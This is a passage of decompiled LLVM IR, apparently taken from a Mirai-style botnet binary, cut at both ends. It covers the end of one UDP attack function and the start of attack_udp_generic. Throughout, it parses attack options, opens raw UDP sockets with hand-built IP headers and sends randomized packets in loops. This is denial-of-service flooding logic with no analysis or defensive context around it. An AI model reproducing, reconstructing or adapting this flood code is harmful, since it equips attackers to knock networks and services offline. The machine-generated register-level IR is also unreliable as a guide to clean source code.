  store i32 65535, i32* @r4, align 4
  %v0_b640 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_b634, i32* @r8, align 4
  %v0_b650 = load i32, i32* @r5, align 4
  %v5_b654 = inttoptr i32 %v0_b640 to i32*
  %v6_b654 = call i32 @attack_get_opt_int(i32 %v0_b650, i32* %v5_b654, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v3_b65c = urem i32 %v6_b654, 65536
  %v0_b660 = load i32, i32* @r6, align 4
  %v0_b668 = load i32, i32* @r4, align 4
  store i32 %v0_b668, i32* %r3.global-to-local, align 4
  %v0_b66c = load i32, i32* @r5, align 4
  %v5_b674 = inttoptr i32 %v0_b660 to i32*
  %v6_b674 = call i32 @attack_get_opt_int(i32 %v0_b66c, i32* %v5_b674, i32 6, i32 %v0_b668, i32 %v3_b65c)
  %v0_b678 = load i32, i32* @r6, align 4
  %v3_b67c = mul i32 %v6_b674, 65536
  store i32 %v3_b67c, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_b688 = load i32, i32* @r5, align 4
  %v5_b68c = inttoptr i32 %v0_b678 to i32*
  %v6_b68c = call i32 @attack_get_opt_int(i32 %v0_b688, i32* %v5_b68c, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b69c = load i32, i32* @r6, align 4
  %v0_b6a0 = load i32, i32* @r5, align 4
  %v3_b6a4 = urem i32 %v6_b68c, 65536
  store i32 %v3_b6a4, i32* @r5, align 4
  %v5_b6a8 = inttoptr i32 %v0_b69c to i32*
  %v6_b6a8 = call i32 @attack_get_opt_int(i32 %v0_b6a0, i32* %v5_b6a8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_b6ac = load i32, i32* %sb.global-to-local, align 4
  %v3_b6ac = udiv i32 %v0_b6ac, 65536
  store i32 %v3_b6ac, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b6b4 = load i32, i32* @r4, align 4
  %v9_b6b4 = icmp eq i32 %v3_b6ac, %v1_b6b4
  br i1 %v9_b6b4, label %dec_label_pc_b6e4, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_b6cc = udiv i32 %v0_b6ac, 16777216
  store i32 %v4_b6cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b6f4

dec_label_pc_b6e4:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_b6e4 = call i32 @rand_next()
  br label %dec_label_pc_b6f4

dec_label_pc_b6f4:                                ; preds = %bb, %dec_label_pc_b6e4
  %v0_b6d810 = urem i32 %v6_b6a8, 256
  %v0_b6f4 = load i32, i32* @r7, align 4
  %v2_b6f4 = icmp eq i32 %v0_b6f4, 0
  br i1 %v2_b6f4, label %dec_label_pc_b834, label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %dec_label_pc_b6f4
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_b7a8 = udiv i32 %v3_b65c, 256
  %v1_b7a4 = mul i32 %v6_b654, 256
  %v4_b7ac = and i32 %v1_b7a4, 65280
  %v5_b7ac = or i32 %v4_b7ac, %v3_b7a8
  %v2_b72c = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_b78c

dec_label_pc_b70c:                                ; preds = %bb51, %dec_label_pc_b7cc
  %v3_b718 = call i32 @socket(i32 2, i32 2, i32 17)
  %v7_b720 = icmp eq i32 %v3_b718, -1
  %v0_b724 = load i32, i32* @sb, align 4
  %v1_b724 = add i32 %v0_b724, 1
  store i32 %v1_b724, i32* @sb, align 4
  %v0_b728 = load i32, i32* @fp, align 4
  %v1_b728 = add i32 %v0_b728, 24
  store i32 %v1_b728, i32* @fp, align 4
  %v2_b734 = load i32, i32* @r8, align 4
  %v3_b734 = add i32 %v2_b734, %stack_var_-60.0
  %v4_b734 = inttoptr i32 %v3_b734 to i32*
  store i32 %v3_b718, i32* %v4_b734, align 4
  br i1 %v7_b720, label %dec_label_pc_b828, label %dec_label_pc_b73c

dec_label_pc_b73c:                                ; preds = %dec_label_pc_b70c
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
  %v3_b754 = call i32 @bind(i32 %v3_b718, i32 %v2_b72c, i32 16)
  %v0_b758 = load i32, i32* @r6, align 4
  %v1_b758 = add i32 %v0_b758, 20
  %v2_b758 = inttoptr i32 %v1_b758 to i8*
  %v3_b758 = load i8, i8* %v2_b758, align 1
  %v4_b758 = zext i8 %v3_b758 to i32
  store i32 %v4_b758, i32* %r3.global-to-local, align 4
  %tmp = icmp ult i8 %v3_b758, 32
  br i1 %tmp, label %dec_label_pc_b7e0, label %dec_label_pc_b764

dec_label_pc_b764:                                ; preds = %dec_label_pc_b73c, %dec_label_pc_b7e0
  %v0_b768 = phi i32 [ %v0_b758, %dec_label_pc_b73c ], [ %v0_b768.pre, %dec_label_pc_b7e0 ]
  %v1_b76c = load i32, i32* @r8, align 4
  %v2_b76c = add i32 %v1_b76c, %stack_var_-60.0
  %v3_b76c = inttoptr i32 %v2_b76c to i32*
  %v4_b76c = load i32, i32* %v3_b76c, align 4
  %v3_b774 = call i32 @__libc_connect(i32 %v4_b76c, i32 %v0_b768, i32 16)
  %v0_b77c = load i32, i32* @sb, align 4
  %v1_b77c = load i32, i32* @r7, align 4
  %v9_b77c = icmp eq i32 %v0_b77c, %v1_b77c
  %v1_b780 = add i32 %stack_var_-60.0, 4
  store i32 %v1_b780, i32* %r3.global-to-local, align 4
  br i1 %v9_b77c, label %dec_label_pc_b834, label %dec_label_pc_b78c

dec_label_pc_b78c:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b6fc
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_b6fc ], [ %v1_b780, %dec_label_pc_b764 ]
  store i32 65535, i32* @r4, align 4
  %v2_b79c = call i32 @calloc(i32 65535, i32 1)
  store i32 %v5_b7ac, i32* %r3.global-to-local, align 4
  %v1_b7b8 = load i32, i32* @r4, align 4
  %v9_b7b8 = icmp eq i32 %v3_b65c, %v1_b7b8
  %v1_b7bc = load i32, i32* @fp, align 4
  %v2_b7bc = add i32 %v1_b7bc, %arg2
  store i32 %v2_b7bc, i32* @r6, align 4
  %v2_b7c0 = load i32, i32* @sl, align 4
  %v3_b7c0 = add i32 %v2_b7c0, %stack_var_-60.0
  %v4_b7c0 = inttoptr i32 %v3_b7c0 to i32*
  store i32 %v2_b79c, i32* %v4_b7c0, align 4
  br i1 %v9_b7b8, label %dec_label_pc_b7cc, label %bb51

bb51:                                             ; preds = %dec_label_pc_b78c
  %v1_b7c4 = load i32, i32* %r3.global-to-local, align 4
  %v2_b7c4 = trunc i32 %v1_b7c4 to i16
  %v3_b7c4 = load i32, i32* @r6, align 4
  %v4_b7c4 = add i32 %v3_b7c4, 2
  %v5_b7c4 = inttoptr i32 %v4_b7c4 to i16*
  store i16 %v2_b7c4, i16* %v5_b7c4, align 2
  br label %dec_label_pc_b70c

dec_label_pc_b7cc:                                ; preds = %dec_label_pc_b78c
  %v0_b7cc = call i32 @rand_next()
  %v1_b7cc = trunc i32 %v0_b7cc to i16
  %v0_b7d4 = load i32, i32* @fp, align 4
  %v2_b7d4 = add i32 %v0_b7d4, %arg2
  store i32 %v2_b7d4, i32* @r6, align 4
  %v4_b7d8 = add i32 %v2_b7d4, 2
  %v5_b7d8 = inttoptr i32 %v4_b7d8 to i16*
  store i16 %v1_b7cc, i16* %v5_b7d8, align 2
  br label %dec_label_pc_b70c

dec_label_pc_b7e0:                                ; preds = %dec_label_pc_b73c
  %v1_b7e0 = add i32 %v0_b758, 16
  %v2_b7e0 = inttoptr i32 %v1_b7e0 to i32*
  %v3_b7e0 = load i32, i32* %v2_b7e0, align 4
  store i32 %v3_b7e0, i32* @r4, align 4
  %v0_b7e4 = call i32 @rand_next()
  %v0_b7e8 = load i32, i32* @r4, align 4
  %v1_b7e8 = and i32 %v0_b7e8, 16711680
  %v3_b7ec = udiv i32 %v0_b7e8, 16777216
  %v4_b7f0 = udiv i32 %v1_b7e8, 256
  %v5_b7f0 = or i32 %v4_b7f0, %v3_b7ec
  %v1_b7f4 = and i32 %v0_b7e8, ptrtoint (i32* @global_var_ff00.33 to i32)
  store i32 %v1_b7f4, i32* %r3.global-to-local, align 4
  %v4_b7f8 = mul i32 %v1_b7f4, 256
  %v5_b7f8 = or i32 %v5_b7f0, %v4_b7f8
  %v0_b7fc = load i32, i32* @r6, align 4
  %v1_b7fc = add i32 %v0_b7fc, 20
  %v2_b7fc = inttoptr i32 %v1_b7fc to i8*
  %v3_b7fc = load i8, i8* %v2_b7fc, align 1
  %v4_b7fc = zext i8 %v3_b7fc to i32
  %v4_b800 = mul i32 %v0_b7e8, 16777216
  %v5_b800 = or i32 %v5_b7f8, %v4_b800
  %v7_b804 = lshr i32 %v0_b7e4, %v4_b7fc
  %v8_b804 = add i32 %v7_b804, %v5_b800
  %v5_b81c = call i32 @llvm.bswap.i32(i32 %v8_b804)
  store i32 %v5_b81c, i32* %r3.global-to-local, align 4
  %v2_b820 = add i32 %v0_b7fc, 4
  %v3_b820 = inttoptr i32 %v2_b820 to i32*
  store i32 %v5_b81c, i32* %v3_b820, align 4
  %v0_b768.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_b764

dec_label_pc_b828:                                ; preds = %dec_label_pc_b70c
  store i32 %v18_b608, i32* %sb.global-to-local, align 4
  ret i32 %v3_b718

dec_label_pc_b834:                                ; preds = %dec_label_pc_b764, %dec_label_pc_b6f4
  %v1_b87422 = phi i32 [ 0, %dec_label_pc_b6f4 ], [ %v0_b77c, %dec_label_pc_b764 ]
  %v2_b838 = icmp eq i32 %v0_b6d810, 0
  br i1 %v2_b838, label %dec_label_pc_b858.outer, label %dec_label_pc_b870

dec_label_pc_b848:                                ; preds = %dec_label_pc_b858
  store i32 %v1_b84c, i32* @r4, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b848 = load i32, i32* @r8, align 4
  %v4_b848 = mul i32 %v1_b84c, 4
  %v5_b848 = add i32 %v0_b848, %v4_b848
  %v6_b848 = inttoptr i32 %v5_b848 to i32*
  %v7_b848 = load i32, i32* %v6_b848, align 4
  %v0_b84c = load i32, i32* @sl, align 4
  %v5_b84c = add i32 %v0_b84c, %v4_b848
  %v6_b84c = inttoptr i32 %v5_b84c to i32*
  %v7_b84c = load i32, i32* %v6_b84c, align 4
  %v4_b850 = call i32 @__libc_send(i32 %v7_b848, i32 %v7_b84c, i32 %v0_b85c, i32 16384)
  %v0_b854 = load i32, i32* @r4, align 4
  %v1_b854 = add i32 %v0_b854, 1
  %v0_b858.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b858.outer

dec_label_pc_b858.outer:                          ; preds = %dec_label_pc_b834, %dec_label_pc_b848
  %v0_b858.ph = phi i32 [ %v0_b858.pre.pre, %dec_label_pc_b848 ], [ %v1_b87422, %dec_label_pc_b834 ]
  %v1_b84c.ph = phi i32 [ %v1_b854, %dec_label_pc_b848 ], [ 0, %dec_label_pc_b834 ]
  %v0_b85c = load i32, i32* @r5, align 4
  br label %dec_label_pc_b858

dec_label_pc_b858:                                ; preds = %dec_label_pc_b858.outer, %dec_label_pc_b858
  %v1_b84c = phi i32 [ 0, %dec_label_pc_b858 ], [ %v1_b84c.ph, %dec_label_pc_b858.outer ]
  %v8_b864 = icmp sgt i32 %v0_b858.ph, %v1_b84c
  br i1 %v8_b864, label %dec_label_pc_b848, label %dec_label_pc_b858

dec_label_pc_b870:                                ; preds = %dec_label_pc_b874, %dec_label_pc_b834
  %v1_b87421 = phi i32 [ %v1_b87422, %dec_label_pc_b834 ], [ %v1_b874, %dec_label_pc_b874 ]
  br label %dec_label_pc_b874

dec_label_pc_b874:                                ; preds = %dec_label_pc_b880, %dec_label_pc_b870
  %v1_b874 = phi i32 [ %v1_b87421, %dec_label_pc_b870 ], [ %v1_b874.pre, %dec_label_pc_b880 ]
  %v1_b880 = phi i32 [ 0, %dec_label_pc_b870 ], [ %v1_b8a0, %dec_label_pc_b880 ]
  store i32 %v1_b880, i32* @r6, align 4
  %v6_b87c = icmp slt i32 %v1_b880, %v1_b874
  br i1 %v6_b87c, label %dec_label_pc_b880, label %dec_label_pc_b870

dec_label_pc_b880:                                ; preds = %dec_label_pc_b874
  %v0_b878 = load i32, i32* @r5, align 4
  %v0_b880 = load i32, i32* @sl, align 4
  %v4_b880 = mul i32 %v1_b880, 4
  %v5_b880 = add i32 %v0_b880, %v4_b880
  %v6_b880 = inttoptr i32 %v5_b880 to i32*
  %v7_b880 = load i32, i32* %v6_b880, align 4
  store i32 %v7_b880, i32* @r4, align 4
  %v2_b888 = inttoptr i32 %v7_b880 to i16*
  %v3_b888 = call i32 @rand_str(i16* %v2_b888, i32 %v0_b878)
  %v0_b88c = load i32, i32* @r8, align 4
  %v1_b88c = load i32, i32* @r6, align 4
  %v4_b88c = mul i32 %v1_b88c, 4
  %v5_b88c = add i32 %v4_b88c, %v0_b88c
  %v6_b88c = inttoptr i32 %v5_b88c to i32*
  %v7_b88c = load i32, i32* %v6_b88c, align 4
  %v0_b890 = load i32, i32* @r4, align 4
  %v0_b894 = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_b89c = call i32 @__libc_send(i32 %v7_b88c, i32 %v0_b890, i32 %v0_b894, i32 16384)
  %v0_b8a0 = load i32, i32* @r6, align 4
  %v1_b8a0 = add i32 %v0_b8a0, 1
  %v1_b874.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_b874

; uselistorder directives
  uselistorder i32 %v1_b874, { 1, 0 }
  uselistorder i32 %v1_b84c, { 2, 1, 0 }
  uselistorder i32 %v5_b81c, { 1, 0 }
  uselistorder i32 %v0_b7e8, { 0, 2, 1, 3 }
  uselistorder i32 %stack_var_-60.0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_b758, { 1, 0, 2 }
  uselistorder i32 %v3_b718, { 1, 2, 3, 0 }
  uselistorder i32 %v3_b6ac, { 1, 0 }
  uselistorder i32 %v3_b65c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 1, 3, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 3, 4, 8, 9, 5, 6, 7, 10, 11, 12, 13, 14, 15, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_b858, { 1, 0 }
  uselistorder label %dec_label_pc_b858.outer, { 1, 0 }
  uselistorder label %dec_label_pc_b764, { 1, 0 }
  uselistorder label %dec_label_pc_b70c, { 1, 0 }
  uselistorder label %dec_label_pc_b6f4, { 1, 0 }
}

define i32 @attack_udp_generic(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_b8a8 = load i32, i32* @sb, align 4
  %v27_b8a8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b8c4 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_b8c8 = load i32, i32* @r5, align 4
  store i32 %v0_b8c8, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b8d8 = load i32, i32* @r4, align 4
  store i32 %v0_b8d8, i32* %r0.global-to-local, align 4
  %v5_b8dc = inttoptr i32 %v0_b8c8 to i32*
  %v6_b8dc = call i32 @attack_get_opt_int(i32 %v0_b8d8, i32* %v5_b8dc, i32 2, i32 0, i32 %v2_b8c4)
  %v1_b8e8 = urem i32 %v6_b8dc, 256
  store i32 %v1_b8e8, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b8f4 = load i32, i32* @r5, align 4
  store i32 %v0_b8f4, i32* %r1.global-to-local, align 4
  %v0_b8f8 = load i32, i32* @r4, align 4
  store i32 %v0_b8f8, i32* %r0.global-to-local, align 4
  %v5_b8fc = trunc i32 %v6_b8dc to i8
  %v6_b900 = inttoptr i32 %v0_b8f4 to i32*
  %v7_b900 = call i32 @attack_get_opt_int(i32 %v0_b8f8, i32* %v6_b900, i32 3, i32 65535, i32 %v6_b8dc)
  %v0_b904 = load i32, i32* @r5, align 4
  store i32 %v0_b904, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_b914 = load i32, i32* @r4, align 4
  store i32 %v0_b914, i32* %r0.global-to-local, align 4
  %v5_b918 = inttoptr i32 %v0_b904 to i32*
  %v6_b918 = call i32 @attack_get_opt_int(i32 %v0_b914, i32* %v5_b918, i32 4, i32 64, i32 %v7_b900)
  %v1_b920 = urem i32 %v6_b918, 256
  store i32 %v1_b920, i32* %ip.global-to-local, align 4
  %v0_b924 = load i32, i32* @r5, align 4
  store i32 %v0_b924, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b930 = load i32, i32* @r4, align 4
  store i32 %v0_b930, i32* %r0.global-to-local, align 4
  %v6_b938 = inttoptr i32 %v0_b924 to i32*
  %v7_b938 = call i32 @attack_get_opt_int(i32 %v0_b930, i32* %v6_b938, i32 5, i32 0, i32 %v1_b920)
  %v1_b944 = urem i32 %v7_b938, 256
  store i32 %v1_b944, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b950 = load i32, i32* @r5, align 4
  store i32 %v0_b950, i32* %r1.global-to-local, align 4
  %v0_b954 = load i32, i32* @r4, align 4
  store i32 %v0_b954, i32* %r0.global-to-local, align 4
  %v5_b95c = inttoptr i32 %v0_b950 to i32*
  %v6_b95c = call i32 @attack_get_opt_int(i32 %v0_b954, i32* %v5_b95c, i32 6, i32 65535, i32 %v1_b944)
  %v0_b964 = load i32, i32* @r5, align 4
  store i32 %v0_b964, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_b95c, i32* %sb.global-to-local, align 4
  %v0_b974 = load i32, i32* @r4, align 4
  store i32 %v0_b974, i32* %r0.global-to-local, align 4
  %v5_b978 = inttoptr i32 %v0_b964 to i32*
  %v6_b978 = call i32 @attack_get_opt_int(i32 %v0_b974, i32* %v5_b978, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b97c = load i32, i32* @r5, align 4
  store i32 %v0_b97c, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_b978, i32* @sl, align 4
  %v0_b98c = load i32, i32* @r4, align 4
  store i32 %v0_b98c, i32* %r0.global-to-local, align 4
  %v5_b990 = inttoptr i32 %v0_b97c to i32*
  %v6_b990 = call i32 @attack_get_opt_int(i32 %v0_b98c, i32* %v5_b990, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b99c = load i32, i32* @r5, align 4
  store i32 %v0_b99c, i32* %r1.global-to-local, align 4
  store i32 %v6_b990, i32* @r6, align 4
  %v0_b9a4 = load i32, i32* @r4, align 4
  store i32 %v0_b9a4, i32* %r0.global-to-local, align 4
  %v5_b9a8 = inttoptr i32 %v0_b99c to i32*
  %v6_b9a8 = call i32 @attack_get_opt_int(i32 %v0_b9a4, i32* %v5_b9a8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v2_b9b4 = load i32, i32* @global_var_24f40.59, align 4
  store i32 %v2_b9b4, i32* %r3.global-to-local, align 4
  %v1_b9b8 = urem i32 %v6_b9a8, 256
  store i32 %v1_b9b8, i32* %ip.global-to-local, align 4
  %v0_b9bc = load i32, i32* @r5, align 4
  store i32 %v0_b9bc, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b9c4 = load i32, i32* @r4, align 4
  store i32 %v0_b9c4, i32* %r0.global-to-local, align 4
  %v5_b9cc = inttoptr i32 %v0_b9bc to i32*
  %v6_b9cc = call i32 @attack_get_opt_int(i32 %v0_b9c4, i32* %v5_b9cc, i32 25, i32 %v2_b9b4, i32 %v1_b9b8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b9e0 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_b9e0, i32* %r0.global-to-local, align 4
  %v7_b9e4 = icmp eq i32 %v3_b9e0, -1
  store i1 %v7_b9e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b9e0, i32* @fp, align 4
  br i1 %v7_b9e4, label %dec_label_pc_bd84, label %dec_label_pc_b9f0

dec_label_pc_b9f0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b9f8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b9f8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_ba0c = call i32 @__GI_setsockopt(i32 %v3_b9e0, i32 0, i32 3, i32 %v6_b9f8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_ba0c, i32* %r0.global-to-local, align 4
  %v7_ba10 = icmp eq i32 %v5_ba0c, -1
  store i1 %v7_ba10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ba10, label %dec_label_pc_bd7c, label %dec_label_pc_ba18

dec_label_pc_ba18:                                ; preds = %dec_label_pc_b9f0
  %v0_ba18 = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_ba24 = urem i32 %v0_ba18, 65536
  store i32 %v3_ba24, i32* %r2.global-to-local, align 4
  %v3_ba28 = icmp ugt i32 %v3_ba24, 1459
  %v9_ba28 = icmp eq i32 %v3_ba24, 1460
  store i1 %v9_ba28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ba28, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_ba18
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_ba18, %bb
  %v0_ba84 = phi i32 [ %v3_ba24, %dec_label_pc_ba18 ], [ 1460, %bb ]
  store i32 %v7_b900, i32* %r0.global-to-local, align 4
  %v0_ba34 = load i32, i32* %sb.global-to-local, align 4
  %v3_ba3c = urem i32 %v0_ba34, 65536
  store i32 %v3_ba3c, i32* %ip.global-to-local, align 4
  %v0_ba40 = load i32, i32* @r7, align 4
  %v2_ba40 = icmp eq i32 %v0_ba40, 0
  store i1 %v2_ba40, i1* %cpsr_z.global-to-local, align 1
  %v0_ba44 = load i32, i32* @sl, align 4
  %v3_ba44 = mul i32 %v0_ba44, 65536
  br i1 %v2_ba40, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_ba84, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_ba74 = phi i32 [ %v3_ba3c, %bb48 ], [ %v0_ba84, %bb49 ]
  %v3_ba54 = urem i32 %v0_ba44, 65536
  store i32 %v3_ba54, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_ba5c = urem i32 %v7_b900, 65536
  store i32 %v3_ba5c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ba40, label %.thread, label %dec_label_pc_ba7c

.thread:                                          ; preds = %bb50
  %v2_ba70 = add nsw i32 %v1_ba74, 28
  store i32 %v2_ba70, i32* @sb, align 4
  %v2_ba74 = add nsw i32 %v1_ba74, 8
  store i32 %v2_ba74, i32* @sl, align 4
  br label %dec_label_pc_bba0.preheader

dec_label_pc_ba7c:                                ; preds = %bb50
  %v1_ba84 = add nuw nsw i32 %v0_ba84, 28
  store i32 %v1_ba84, i32* @sb, align 4
  %v1_ba88 = add nuw nsw i32 %v0_ba84, 8
  store i32 %v1_ba88, i32* @sl, align 4
  %tmp51 = mul i32 %v0_ba34, 256
  %v3_ba9c = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_ba34, 256
  %v4_baac = urem i32 %tmp52, 256
  %v5_baac = or i32 %v4_baac, %v3_ba9c
  store i32 %v5_baac, i32* @r6, align 4
  store i32 %v3_ba44, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_ba84, 256
  %v3_bab8 = and i32 %tmp53, 65280
  store i32 %v3_bab8, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_ba44, 256
  %v3_babc = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_ba88, 256
  %v3_bac0 = and i32 %tmp55, 65280
  store i32 %v3_bac0, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_ba84, 256
  %v4_bac4 = urem i32 %tmp56, 256
  %v5_bac4 = or i32 %v4_bac4, %v3_bab8
  store i32 %v5_bac4, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_ba44, 256
  %v4_bac8 = urem i32 %tmp57, 256
  %v5_bac8 = or i32 %v4_bac8, %v3_babc
  store i32 %v5_bac8, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_ba88 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_b900, 256
  %v3_bad0 = and i32 %tmp58, 65280
  store i32 %v3_bad0, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_b900, 256
  %v4_bae0 = urem i32 %tmp59, 256
  %v5_bae0 = or i32 %v4_bae0, %v3_bad0
  store i32 %v5_bae0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_bac4, 65536
  %v4_bb54 = sdiv i32 %sext, 65536
  %sext6 = mul nuw i32 %v5_bac8, 65536
  %v7_bb88 = sdiv i32 %sext6, 65536
  %v1_bb48 = trunc i32 %v6_b918 to i8
  %v3_bb88 = sext i16 %rev to i32
  br label %dec_label_pc_bae8

dec_label_pc_bae8:                                ; preds = %.thread8, %dec_label_pc_ba7c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_baf4 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_baf4, i32* %r0.global-to-local, align 4
  store i32 %v2_b8c4, i32* %r3.global-to-local, align 4
  %v3_bafc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bafc, i32* %r1.global-to-local, align 4
  %v2_bb00 = load i32, i32* @r4, align 4
  %v5_bb00 = mul i32 %v2_bb00, 4
  %v6_bb00 = add i32 %v5_bb00, %v2_b8c4
  %v7_bb00 = inttoptr i32 %v6_bb00 to i32*
  store i32 %v2_baf4, i32* %v7_bb00, align 4
  %v0_bb04 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb04 = load i32, i32* %r1.global-to-local, align 4
  %v4_bb04 = mul i32 %v1_bb04, 4
  %v5_bb04 = add i32 %v4_bb04, %v0_bb04
  %v6_bb04 = inttoptr i32 %v5_bb04 to i32*
  %v7_bb04 = load i32, i32* %v6_bb04, align 4
  store i32 %v7_bb04, i32* %r0.global-to-local, align 4
  %v1_bb08 = inttoptr i32 %v7_bb04 to i8*
  %v2_bb08 = load i8, i8* %v1_bb08, align 1
  %tmp = urem i8 %v2_bb08, 16
  %v1_bb0c = zext i8 %tmp to i32
  %v1_bb10 = or i32 %v1_bb0c, 64
  store i32 %v1_bb10, i32* %r3.global-to-local, align 4
  %v1_bb14 = trunc i32 %v1_bb10 to i8
  store i8 %v1_bb14, i8* %v1_bb08, align 1
  %v0_bb18 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb18 = inttoptr i32 %v0_bb18 to i8*
  %v2_bb18 = load i8, i8* %v1_bb18, align 1
  %v1_bb1c = and i8 %v2_bb18, -16
  %v1_bb20 = or i8 %v1_bb1c, 5
  store i32 %v1_b944, i32* %ip.global-to-local, align 4
  %v0_bb28 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb28 = mul i32 %v0_bb28, 32
  store i32 %v3_bb28, i32* %r2.global-to-local, align 4
  store i8 %v1_bb20, i8* %v1_bb18, align 1
  %v0_bb30 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb30 = add i32 %v0_bb30, 1
  store i32 %v1_bb30, i32* @r4, align 4
  %v0_bb34 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_bb30, -8
  %v5_bb34 = add i32 %v0_bb34, %tmp61
  store i32 %v5_bb34, i32* %r2.global-to-local, align 4
